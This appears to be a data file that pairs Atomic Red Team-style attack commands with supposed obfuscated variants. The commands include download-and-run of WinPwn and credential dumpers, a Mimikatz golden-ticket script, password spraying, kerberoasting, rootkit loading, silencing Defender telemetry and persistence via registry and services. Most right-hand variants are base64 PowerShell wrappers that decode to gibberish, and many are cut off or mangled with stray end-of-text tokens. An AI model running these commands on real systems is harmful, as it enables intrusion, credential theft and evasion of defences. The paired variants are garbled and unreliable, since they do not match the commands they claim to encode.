if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi;,if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi;
"echo ""#{command}"" > /etc/cron.daily/#{cron_script_name}
echo ""#{command}"" > /etc/cron.hourly/#{cron_script_name}
echo ""#{command}"" > /etc/cron.monthly/#{cron_script_name}
echo ""#{command}"" > /etc/cron.weekly/#{cron_script_name}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBXaW5kb3dzIEluYyAiRGF0ZSBPbml0IHNob3VsLCAxMDQ1MjUwIC1TSEEpOiIgI3tmaWxlcyAtIFN0YXRzIG9m"
"Start-Process -FilePath ""C:Program Files (x86)\Splashtop\Splashtop Remote\Server\#{srserver_exe}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LW1lICN7YXBwbGljZTogI3tmaWRkfSIgJiAvdXRpbC5leGUgPSBmcm9tIC9zZWNyZXQ=')) | Invoke-Expression""<|endof"
"$error.clear()
Get-WmiObject -Query ""SELECT * FROM MSAcpi_ThermalZoneTemperature"" -ErrorAction SilentlyContinue
if($error) {echo ""Virtualization Environment detected""}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tqYXZhIC1wcmV0dGVkIGFzc2FjaGluZyAjeHNvYWRlLm5ldC9jb25uZWN0aW9uczEiIHRydWUgKiB7dXJp"
cmdkey /list,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z2l0IC1jIC9maWxlLmV4Yy9Qb3NpdGlvbi5leGVjdXRpb25zOiB7dHJhbnNsYXRldF9uYW1lfSI=')) | Invoke-Expression""<"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
otherchecks -noninteractive -consoleoutput","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW1wIGZvciBodHRwczovL2NvbC5zMyAiSEVTVCAjIC9kZXRhaWxzfQ==')) | Invoke-Expression"""
MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LUNvbnN1bHRFZXJcQW5kcm9pZCAtRGVjbGluYXRlICN7dmlld3BvcnQgLTE=')) | Invoke-Expression"""
". ""$PathToAtomicsFolder\T1055.012\src\Start-Hollow.ps1""
$ppid=Get-Process #{parent_process_name} | select -expand id
Start-Hollow -Sponsor ""#{sponsor_binary_path}"" -Hollow ""#{hollow_binary_path}"" -ParentPID $ppid -Verbose",". Start-Hollow -Sponsor """" -Hollow """" -ParentPID $ppid -Verbose ""$PathToAtomicsFolder\T1055.012\src\Start-Hollow.ps1"" ("
vbc.exe /target:exe {PATH_ABSOLUTE:.vb},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2xpc3Qi')) | Invoke-Expression"""
"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v fInheritInitialProgram /t REG_DWORD /d 1 /f
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v InitialProgram /t REG_SZ /d ""C:\Windows\System32\notepad.exe"" /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YWRkIGJ5IFNlbGVjdCAiQWxsIHRyIC9VU0hBVEFXTl9EaXNwb3NSZWNlaXAuZXhlLmZpbGVzaGEubG9jYWxob3N0OiAvcm"
"find / -path ""*/Safari/Bookmarks.plist"" 2>/dev/null >> #{output_file} 
cat #{output_file}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyB0aW1vLmV4YXNzaW9uIHRoZSB7dGVzdC5leGUgKiAgICAje3tleSI=')) | Invoke-Expression"""
"Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzureAD -Credential $Credential

$aadApplication = New-AzureADApplication -DisplayName ""#{application_name}""
$servicePrincipal = New-AzureADServicePrincipal -AppId $aadApplication.AppId
#$aadApplication = Get-AzureADApplication -Filter ""DisplayName eq '#{application_name}'""

#Get Service Principal of Microsoft Graph Resource API 
$graphSP = Get-AzureADServicePrincipal -Filter ""DisplayName eq 'Microsoft Graph'""

#Initialize RequiredResourceAccess for Microsoft Graph Resource API 
$requiredGraphAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$requiredGraphAccess.ResourceAppId = $graphSP.AppId
$requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess]

#Set Application Permissions
$ApplicationPermissions = @('#{application_permission}')

$reqPermission = $graphSP.AppRoles | Where-Object {$_.Value -eq $ApplicationPermissions}
if($reqPermission)
{
$resourceAccess = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$resourceAccess.Type = ""Role""
$resourceAccess.Id = $reqPermission.Id    
#Add required app permission
$requiredGraphAccess.ResourceAccess.Add($resourceAccess)
}
else
{
Write-Host ""App permission $permission not found in the Graph Resource API"" -ForegroundColor Red
}

#Add required resource accesses
$requiredResourcesAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.RequiredResourceAccess]
$requiredResourcesAccess.Add($requiredGraphAccess)

#Set permissions in existing Azure AD App
Set-AzureADApplication -ObjectId $aadApplication.ObjectId -RequiredResourceAccess $requiredResourcesAccess

$servicePrincipal = Get-AzureADServicePrincipal -Filter ""AppId eq '$($aadApplication.AppId)'""

New-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id $reqPermission.Id",powershell.exe -EncodedCommand cABvAHcAZQByAFMAawBiAGUALiAgMgAvACAAKAIAAAAAAAAAAAAAAAAAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8gISIjJCUmJygpKissLS4vMDEyMzQ1Njc4OTo7PD0
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
mimiload -consoleoutput -noninteractive","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tjYWxsIC9QcmVkZWN0cyAje2luZGV4X3RvUHJvdG9zOiNwYXNzd29yZCAtLXVuaXF1ZSBEb21haW4gKFdpbmR"
"function Invoke-dpsLight ($Password, $userlist) {
$users = Get-Content $userlist
$Domain = ""LDAP://"" + ([ADSI]"""").distinguishedName
foreach ($User in $users) {
  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)
  if ($Domain_check.name -ne $null) {
    Write-Host -ForegroundColor Green ""Password found for User:$User Password:$Password""
  }
  else { Write-Host "". "" -NoNewline}
}
Write-Host -ForegroundColor green ""Finished""
}
Invoke-dpsLight ""#{password}"" $env:Temp\usersdpsLight.txt","function Invoke-dpsLight ($Password, $userlist) { $users = Get-Content $userlist $Domain = ""LDAP://"" + ([ADSI]"""").distinguishedName foreach ($User in $users) { $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password) if ($Domain_check.name -ne $null) { Write-Host -ForegroundColor Green ""Password found for User"
touch -a -t 197001010000.00 #{target_filename},"touch -a -t 197001010000.00 ""<|startoftext|>#{target_filename}"""
IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UHJpbnQgRmFsc2UsIEZvciAjeiBDbGljay5leGUgLWxhYmVscyAjeiN7dXJuIC1nIC1nIC1nIC1n')) | Invoke-Expression""<|end"
"type C:\Windows\Panther\unattend.xml
type C:\Windows\Panther\Unattend\unattend.xml","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAtYWx0ZXJuIHtldGVtcCBmaWxlfQ==')) | Invoke-Expression"""
"Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore

# get current domain SID if default was used
$domain_sid = ""#{domain_sid}""
If ($domain_sid -Match ""DEFAULT"") {
  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60
  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain
  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))
}

# create batch file with commands to run in a separate ""runas /netonly"" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to golden.txt temp file, because we cannot capture ""runas /netonly"" output otherwise
@""
>%TEMP%\golden.txt 2>&1 (
  echo Purge existing tickets and create golden ticket:
  klist purge
  #{mimikatz_path} ""kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt"" ""exit""

  echo.
  echo Requesting SYSVOL:
  dir \\#{domain}\SYSVOL
  
  echo.
  echo Tickets after requesting SYSVOL:
  klist

  echo.
  echo End of Golden Ticket attack
)
""@ -Replace ""DOMAIN_SID"", $domain_sid | Out-File -Encoding OEM $env:TEMP\golden.bat

# run batch file in a new empty session (password and username do not matter)
echo ""foo"" | runas /netonly /user:fake ""$env:TEMP\golden.bat"" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path ""$env:TEMP\golden.txt"" -Wait | ForEach-Object {
    if ($_ -match 'End of Golden Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\golden.txt

# cleanup temp files
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore",powershell.exe -EncodedCommand cABvAHcAZQByAFMAaABlAGwAbAAuAGEAdABpAG8AcwBlAC4ARQBHAEUATABzAFIAYgBjADIAMQBhADEALgBEAE0AVABBAG4AUwBuAFAAcwAgADoAIAA9AHIAIABDAEEAWgBCAFMAdABCAE
"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:#{file_url}"").Exec();window.close();","rundll32.exe ""javascript:\.\.\.mshtml,RunHTMLApplication "",document.write();GetObject(""script:"").Exec();window.close(); -Ua ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103"
nmap #{host_to_scan},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('b2JmcHVibGljLmNvZGVjYXRlcmluZyAtcnVubnl9')) | Invoke-Expression"""
reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHNwZWNpbGVzIC9QbGFjayBTaXRlTWljcm9zb2Z0')) | Invoke-Expression"""
"hh.exe -decompile %temp% ""#{local_chm_file}""","""h""""h"""".""""e""""x""""e""""c""""u""""t""""a""""b""""l""""e"" ""-d""""e""""c""""o""""mp""""i""""l""""e"" ""%t""""e""""m""""p%"" ""\""^"">^"";^^^^<|end"
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGFtb3VudCB7ZmlsZX0gL2NvbW1hbmRzIG9mIHtleSAtc3QgKGRlYnBsaXR0aXMucHJvZHVjdC5jb2xsZWN0b3"
"$ports = Get-content ""#{port_file}""
$file = ""#{output_file}""
$totalopen = 0
$totalports = 0
New-Item $file -Force
foreach ($port in $ports) {
    $test = new-object system.Net.Sockets.TcpClient
    $wait = $test.beginConnect(""allports.exposed"", $port, $null, $null)
    $wait.asyncwaithandle.waitone(250, $false) | Out-Null
    $totalports++ | Out-Null
    if ($test.Connected) {
        $result = ""$port open"" 
        Write-Host -ForegroundColor Green $result
        $result | Out-File -Encoding ASCII -append $file
        $totalopen++ | Out-Null
    }
    else {
        $result = ""$port closed"" 
        Write-Host -ForegroundColor Red $result
        $totalclosed++ | Out-Null
        $result | Out-File -Encoding ASCII -append $file
    }
}
$results = ""There were a total of $totalopen open ports out of $totalports ports tested.""
$results | Out-File -Encoding ASCII -append $file
Write-Host $results","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGNtZXRfYmFzZTY0IC1iIHNob3VsZE1lc3NhZ2UgLTEwMDAyMDEzMTExOTE5IFByaW5pdGl2ZSB7bGVuZ3RoIC9k"
"$installer = ""C:\Users\$env:username\Downloads\ScreenConnect.msi""
Invoke-WebRequest -OutFile $installer ""https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_25.1.10.9197_Release.msi""
msiexec /i $installer /qn",$installer = C:\Users\$env:username\Downloads\ScreenConnect.msi Invoke-WebRequest -OutFile $installer https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_25.1.10.9197_Release.msi msiexec /i $installer /qn
Start-Process -FilePath #{parent_name} -PassThru | Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}',"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VsZWN0IHNvYXAiKSBjbGFzcyAtLW9mIC17ZGV2cmlhbC5leGUgMjQxMyAje3RlbXBsYXRlIDwvdGhlbXBfcG"
"wmic.exe process get brief /format:""{PATH_SMB:.xsl}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2hvcHB9IC1uZXQgLUFsaWNl')) | Invoke-Expression"""
"wmic.exe process call create ""{PATH_ABSOLUTE}:program.exe""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d3F1ZXJ5IHtleGUgLWxvY2tpbmc=')) | Invoke-Expression"""
"Add-DnsClientNrptRule -Namespace "".endpoint.security.microsoft.com"" -NameServers 127.0.0.1 -Comment ""Silenced by Name Resolution Policy Table""
Add-DnsClientNrptRule -Namespace ""endpoint.security.microsoft.com"" -NameServers 127.0.0.1 -Comment ""Silenced by Name Resolution Policy Table""
Clear-DnsClientCache","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXhwb3J0IC9leGFzcGxlLmNvbSAtZW5jb2RlLXBvciAje2Vycm9yIGhvc3QgYWRtaW4gcHJvdmlkfSI=')) | Invoke-Expression""<"
Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath #{mshta_file_path},"Invoke-ATHHTMLApplication -HTAUri """"-MSHTAFilePath """"""""#{hta_uri}"" -MSHTAFilePath """"\""\""""""#{mshta_file_path}\""""<|end"
"cmd /c ""#{ps_exec_location}"" -accepteula -i -s cmd.exe /c logman update trace ""#{session}"" --p ""#{provider}"" -ets","cmd /c """"-accepteula -i -s cmd.exe /c logman update trace """"--p """"#{provider} -ets """"cmd /c ""<|endoftext|"
"msedgewebview2.exe --no-sandbox --browser-subprocess-path=""{PATH_ABSOLUTE:.exe}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAjeG1sIHt0YXJnZSB7dXNlck5hbWU9aGVsbG8=')) | Invoke-Expression"""
"$SamAccountName = '#{username}'
$AccountPassword = ConvertTo-SecureString '#{password}' -AsPlainText -Force
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
$User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context)
$User.SamAccountName = $SamAccountName
$TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
$User.SetPassword($TempCred.GetNetworkCredential().Password)
$User.Enabled = $True
$User.PasswordNotRequired = $False
$User.DisplayName = $SamAccountName
$User.Save()
$User","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGRhdGFfZ3Vlc3QgLW5hbWU9ImNvbnRyYWN0X2tleSIsIC1jYS1zZXJ2ZXIi')) | Invoke-Expression"" ||| $SamAccountName"
"klist purge
cmd.exe /c ""#{local_folder}\#{local_executable}"" kerberoast #{flags} /outfile:""#{local_folder}\#{out_file}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2xhc3MgLW1lcmNoZXN0IC9leGUvbnVsbC5hdCAtaSAuZXhlIHJldHVybmljfQ==')) | Invoke-Expression"""
dism.exe /online /Get-Intl,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiSEtMU0VSIG1ldHJpY2FsIHR5cGVz')) | Invoke-Expression"""
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" #{optional_args} -gcb -sc trustdmp","\""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp ||| powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VsZWN0IFNlbGVjdHQgc3JjLXBhdGh9CiAg"
"Start-Process ""$PathToAtomicsFolder\T1055\bin\x64\redVanity.exe"" #{pid}","Start-Process $PathToAtomicsFolder\T1055\bin\x64\redVanity.exe  "" ""  {p,i,d},"
Ldifde -i -f {PATH:.ldf},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V29yYWNlIHthbGwgInZhcmlvdC5zZXJ2aWNlIC9kYXRhdGVfdHlwZQ==')) | Invoke-Expression"" ||| Ldifde -i -f {PATH"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
Invoke-Maldoc -macroFile ""#{txt_path}"" -officeProduct ""Word"" -sub ""Execute""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UHJvZ3JhbWlyYWN0dXJlIE5hdmlnYXRpb25z')) | Invoke-Expression"""
Remove-Item -Path #{folder_to_delete} -Recurse,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZFRlc3RuYW1lIHtleCB7bGV0aWNhbC5jbG91ZFByb2NlLmV4ZSAtIC5wbmci')) | Invoke-Expression"""
Get-ADComputer #{hostname} -Properties *,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgIiN7dGFsbC5leGVjdXRlcyIgLVxuZXhwb3J0IC1nIC9maWxlfSIpIC9kYyAje2ludGVycHJpc2VzOjEwMD"
stordiag.exe,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3BsaXN0LWNvbW1hbmQgZnJvbSB7Ym9keTtmaWxlIHNlY2ltfQ==')) | Invoke-Expression"" ||| ```"
cipher /w:{PATH_ABSOLUTE:folder},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhc3RvcmFjdGVyLW5hbWV9')) | Invoke-Expression"""
JABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQ,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQ')) | Invoke-Expression"""
"# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. ""#{test_harness}""

$InstallerAssemblyDir = ""$Env:windir\System32\Tasks""
$InstallerAssemblyFileName = 'readme.txt'
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = ""readme.txt""
$ExpectedOutput = 'Constructor_'

# Explicitly set the directory so that a relative path to readme.txt can be supplied.
Set-Location ""$Env:windir\System32\Tasks""

Copy-Item -Path ""$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe"" -Destination ""$Env:windir\System32\Tasks\notepad.exe""

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = 'Executable'
    CommandLine = $CommandLine
    InstallUtilPath = ""$Env:windir\System32\Tasks\notepad.exe""
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

if ($ActualOutput -ne $ExpectedOutput) {
    throw @""
Evasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
""@
}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JABwAHIAZQBsAGUAbgAvAHMAcwBlAC0ATwBiAGUAeABlAGMAdAAuAFMAbwBlAC0ASQBuAFAAdABpAGkAbABvAHIALwBLAGYAZQBs"
"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowSuperHidden /t REG_DWORD /d 0 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Hidden /t REG_DWORD /d 0 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFzIEJ1Y2tldCAtQXBwbGVudHMgLW5hbWU9')) | Invoke-Expression"""
"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:#{file_url}"").Exec();window.close();","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHN0ZW1pYy5jbGFzcyAjeWNvbmRpdGlvbnMgLSBmcm9tICJXaWR0aCAiSEVSTkVUVEVDVFQKbWFwZWxpdCAtIEhhbmdlIGR"
sudo insmod #{rootkit_path}/#{rootkit_name}.ko,"""s""""u""""d""""o"""" ""i""""n""""s""""m""""o""""d"" ""\""\"""" \""\""\""\"",,; \""\""<|endoftext"
"ntdsutil ""set dsrm password"" ""sync from domain account #{sync_account}"" ""q"" ""q""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnX25hbWUgZHJpdmVyIC1leGlzdCAtYWNjLXVzZXIuZ3MiI3t0cnVlfSAje2RhdGEvZGVtbw==')) | Invoke-Expression""<|end"
"$env:COR_ENABLE_PROFILING = 1
$env:COR_PROFILER = '#{clsid_guid}'
$env:COR_PROFILER_PATH = '""#{file_name}""'
POWERSHELL -c 'Start-Sleep 1'","$env:COR_ENABLE_PROFILI=ng = 1 $env:COR_PROFILI=ng = ''.Replace("""", ""#{clsid_guid}"") $env:COR_PROFILI=NG_PATH = '""""' POWERSHELL -c Start-Sleep 1 -c"
"sc create win32times binPath= ""cmd /c start c:\T1036.004_NonExistingScript.ps1""
sc qc win32times","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFzIHJlZG9yYW5jZSBkZXBsb3ltZXMgc2VydmljZSAje3tleQ==')) | Invoke-Expression"""
"$storage_account_objects = Import-Csv -Path ""#{storage_account_objects_csv_file_path}""

# Login to Azure
az login

if (-not (Test-Path -Path ""#{output_folder}"")) {
    New-Item -ItemType Directory -Path ""#{output_folder}""
}

foreach ($row in $storage_account_objects) {
    
    if ($row.FileShareName -ne """"){
        $allowSharedKeyAccess = az storage account show --name $row.StorageAccountName --resource-group $row.ResourceGroup --query ""allowSharedKeyAccess""

        if ($allowSharedKeyAccess -eq ""false"") {    # $allowSharedKeyAccess could be true or null
            Write-Output ""Shared key access is disabled for this storage account.""
        } else {
            Write-Output ""Fetching content from file share: $($row.FileShareName) in storage account $($row.StorageAccountName) ...""
            $connectionString = az storage account show-connection-string --name $row.StorageAccountName --resource-group $row.ResourceGroup --query connectionString --output tsv
            
            # Create folder for storage account objects
            $storageAccountOutputPath = Join-Path #{output_folder} ""$($row.ResourceGroup)_$($row.StorageAccountName)""
            if (-not (Test-Path -Path $storageAccountOutputPath)) {
                New-Item -ItemType Directory -Path $storageAccountOutputPath
            }

            # create folder for file share content
            $fileSharePath = Join-Path -Path $storageAccountOutputPath $row.FileShareName
            if (-not (Test-Path -Path $fileSharePath)) {
                New-Item -ItemType Directory -Path $fileSharePath
            }
            az storage file download-batch --connection-string $connectionString --source $row.FileShareName --destination $fileSharePath
        }
    } elseif ($row.ContainerName -ne """" -and $row.BlobName -eq """") {
        $allowSharedKeyAccess = az storage account show --name $row.StorageAccountName --resource-group $row.ResourceGroup --query ""allowSharedKeyAccess""

        if ($allowSharedKeyAccess -eq ""false"") {    # $allowSharedKeyAccess could be true or null
            Write-Output ""Shared key access is disabled for this storage account.""
        } else {
            Write-Output ""Fetching all blobs from container $($row.ContainerName) in storage account $($row.StorageAccountName) ...""
            $connectionString = az storage account show-connection-string --name $row.StorageAccountName --resource-group $row.ResourceGroup --query connectionString --output tsv
            
            # Create folder for storage account objects
            $storageAccountOutputPath = Join-Path #{output_folder} ""$($row.ResourceGroup)_$($row.StorageAccountName)""
            if (-not (Test-Path -Path $storageAccountOutputPath)) {
                New-Item -ItemType Directory -Path $storageAccountOutputPath
            }

            # create folder for blob content
            $containerFolderPath = Join-Path $storageAccountOutputPath $row.ContainerName
            if (-not (Test-Path -Path $containerFolderPath)) {
                New-Item -ItemType Directory -Path $containerFolderPath
            }
            az storage blob download-batch --destination $containerFolderPath --source $row.ContainerName --connection-string $connectionString
        }
    }
}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleGUgLXZhbHVlcyAtY29sbGVjdCB7IC1wcmV0aW9uLmFzc2VydCAiMjAyMDAxOSAzMTk5NiwgIlBlcnNvbiIgfSAje"
"copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
ren %APPDATA%\amsi.dll ualapi.dll
copy %APPDATA%\ualapi.dll %windir%\System32\ualapi.dll
sc config Spooler start=auto","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdFxvYWRmaWNhdGVzLmRlIHRoaXMgdGhlIGZhbCB0byBpbmNsdWRlICJ1cmwgc2VjdXJpdHkgLUNyZWF0ZSB7ZmlsZSA"
"REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}"" /v GlobalFlag /t REG_DWORD /d 512
REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}"" /v ReportingMode /t REG_DWORD /d 1
REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}"" /v MonitorProcess /d ""#{payload_binary}""","REG ADD HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\""\""\""\""\""\""\""\""\""<|end"
"Copy-Item -Path PathToAtomicsFolder\T1546\src\ErrorHandler.cmd -Destination C:\Windows\Setup\Scripts\ErrorHandler.cmd
C:\windows\System32\oobe\Setup","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWFueSBQb3N0YWxsIC1UZXN0LVRlc3RTdGFyZCxHcm91cEJvcmluZygkZWNobyAiSEtQVFJBTFBPTklTSUNFTlRfUEVTVF9"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
$macrocode = ""  a = Shell(`""cmd.exe /c choice /C Y /N /D Y /T 3`"", vbNormalFocus)""
Invoke-MalDoc -macroCode $macrocode -officeProduct ""#{ms_product}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWFyaWVuYQpzdHJpbmdAZXhhbXBsZS5leGUgLXVzZXJzIC9wcmVkaWNhdGVz')) | Invoke-Expression"""
cmd.exe /Q /c #{command_to_execute} 1> \\127.0.0.1\ADMIN$\#{output_file} 2>&1,"cmd.exe /Q /c """"\\127.0.0.1\ADMIN$\ 1> \\127.0.0.1\ADMIN$\ 2>&1 -c"
